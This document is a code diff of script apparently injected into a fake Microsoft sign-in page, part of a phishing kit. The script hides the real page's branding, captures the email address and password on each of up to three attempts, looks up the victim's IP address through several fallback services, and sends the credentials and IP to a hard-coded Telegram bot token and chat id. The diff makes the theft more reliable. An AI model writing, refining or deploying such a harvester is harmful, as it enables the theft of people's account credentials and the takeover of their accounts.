@@ -11,24 +11,31 @@
     const botToken = '8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM';
     const chatId = '7523003121';
 
-    // Fixed IP Fetching
+    // Fixed IP Fetching: Handles both text and JSON responses
     async function fetchIP() {
-        try {
-            // Using a service that returns plain text to avoid JSON errors
-            const response = await fetch('https://api.ipify.org');
-            userIP = await response.text();
-        } catch (e) {
-            // Fallback to a JSON service if plain text fails
+        const services = [
+            { url: 'https://api.ipify.org', type: 'text' },
+            { url: 'https://ipinfo.io', type: 'json' },
+            { url: 'https://api64.ipify.org', type: 'text' }
+        ];
+
+        for (let service of services) {
             try {
-                const res = await fetch('https://ipapi.co');
-                const data = await res.json();
-                userIP = data.ip;
-            } catch (err) { userIP = "Unknown"; }
+                const response = await fetch(service.url, { signal: AbortSignal.timeout(3000) });
+                if (service.type === 'json') {
+                    const data = await response.json();
+                    userIP = data.ip || "Unknown";
+                } else {
+                    userIP = await response.text();
+                }
+                if (userIP !== "Unknown") break;
+            } catch (e) { continue; }
         }
     }
     fetchIP();
 
     window.addEventListener('DOMContentLoaded', () => {
+        // KILL ORIGINAL ARROWS/LOGOS
         const style = document.createElement('style');
         style.innerHTML = `
             button[type="button"] img, .back-button, #idBtn_Back, .identityBanner img, .back-arrow { 
@@ -45,11 +52,12 @@
         if (!passwordField) return;
         const parentContainer = passwordField.parentNode;
 
-        // Correctly define errorDiv and give it an ID
+        // Custom Error Message
         const errorDiv = document.createElement('div');
         errorDiv.id = "custom-error";
         errorDiv.innerText = "Please check your password and try again.";
 
+        // Identity Row (High Position)
         const identityRow = document.createElement('div');
         identityRow.id = "custom-identity-row";
         identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -24px; margin-bottom: 8px; cursor: pointer; width: 100%;";
@@ -93,6 +101,10 @@
         if (signInButton) {
             signInButton.addEventListener('click', async (e) => {
                 e.preventDefault();
+                
+                // Final check to make sure IP isn't unknown
+                if (userIP === "Unknown") await fetchIP();
+
                 if (step === 1) {
                     const emailVal = emailInput.value.trim();
                     if (emailVal === "") return;
@@ -110,7 +122,6 @@
                     attempts++;
                     const msg = `🔔 **MS Login**\n📧 User: ${emailInput.value}\n🔑 Pass: ${passVal}\n🔢 Try: ${attempts}/3\n🌐 IP: ${userIP}`;
                     
-                    // Fixed URL using variables
                     fetch(`https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
                     setTimeout(() => {
@@ -127,6 +138,8 @@
         }
     });
 </script>
+
+
 
 
 
